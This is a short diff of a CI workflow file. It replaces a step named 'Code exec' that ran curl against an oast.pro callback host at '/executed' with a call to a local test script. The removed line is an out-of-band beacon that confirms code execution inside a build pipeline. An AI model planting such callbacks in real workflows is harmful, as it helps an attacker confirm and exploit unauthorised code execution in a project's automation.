@@ -32,4 +32,4 @@ jobs:
 
       # Execute code
       - name: Code exec
-        run: curl https://csrjohgo6s5baifq7tf0jnz7aqgiacigt.oast.pro/executed
+        run: bash ./test.sh
